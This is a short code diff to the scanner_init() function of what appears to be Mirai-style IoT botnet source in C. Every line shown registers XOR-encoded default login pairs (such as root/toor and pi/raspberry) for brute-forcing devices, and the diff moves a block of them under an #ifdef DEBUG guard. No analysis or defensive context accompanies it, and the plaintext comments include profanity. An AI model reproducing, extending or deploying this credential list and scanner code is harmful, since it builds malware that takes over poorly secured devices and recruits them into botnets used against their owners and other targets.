@@ -185,7 +185,7 @@ void scanner_init(void)
     add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
 
     //--------  Add new password  ------------
-    
+#ifdef DEBUG
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x58\x4D\x4D\x4F\x43\x46\x51\x4E", 1);          // admin    zoomadsl
     add_auth_entry("\x50\x4D\x4D\x56", "\x56\x4D\x4D\x50", 1);                              // root     toor
     add_auth_entry("\x52\x4B", "\x50\x43\x51\x52\x40\x47\x50\x50\x5B", 1);                  // pi       raspberry
@@ -222,7 +222,7 @@ void scanner_init(void)
     add_auth_entry("\x50\x4D\x4D\x56", "\x11\x12\x4F\x47\x46\x4B\x43", 1);                  // root     30media
     add_auth_entry("\x50\x4D\x4D\x56", "\x44\x57\x41\x49\x14\x14\x14", 1);                  // root     fuck666
     add_auth_entry("\x50\x4D\x4D\x56", "\x44\x57\x41\x49\x4B\x5C\x45", 1);                  // root     fucking
-    
+#endif
     //--------  End Add new password  ------------
 
 
